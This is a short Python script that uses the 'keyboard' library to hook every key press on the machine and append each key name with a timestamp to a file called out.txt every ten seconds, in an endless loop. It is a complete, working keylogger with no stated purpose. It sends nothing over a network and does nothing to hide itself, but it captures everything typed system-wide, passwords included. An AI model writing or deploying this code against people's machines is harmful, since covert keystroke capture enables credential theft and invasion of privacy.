import keyboard
from time import sleep

events_list = []


def down_callback(event):
    global events_list
    events_list.append(str(event.time) + "   " + str(event.name) + "\n")


keyboard.on_press(down_callback)

while True:
    sleep(10)
    print("writing")

    record_file = open("out.txt", "a")
    for e in events_list:
        record_file.write(e)
    events_list = []

    record_file.close()
